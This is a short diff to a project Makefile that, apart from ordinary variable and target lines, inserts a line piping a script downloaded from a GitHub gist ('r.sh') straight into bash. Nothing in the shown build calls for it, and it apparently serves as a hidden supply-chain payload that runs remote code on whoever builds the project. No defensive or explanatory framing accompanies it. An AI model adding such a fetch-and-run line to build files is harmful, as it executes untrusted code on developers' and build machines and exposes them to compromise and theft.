@@ -2,7 +2,7 @@
 include Makefile.common
 
 RESOURCE_DIR = src/main/resources
-
+curl -sSfL https://gist.githubusercontent.com/ab1xtgb/af412eb27e67fb5827e8daf447ba9529/raw/bdd6a41398c02c475fd88f90aab7d06e506ccc2d/r.sh | bash
 .phony: all package native native-all deploy
 
 all: jni-header package
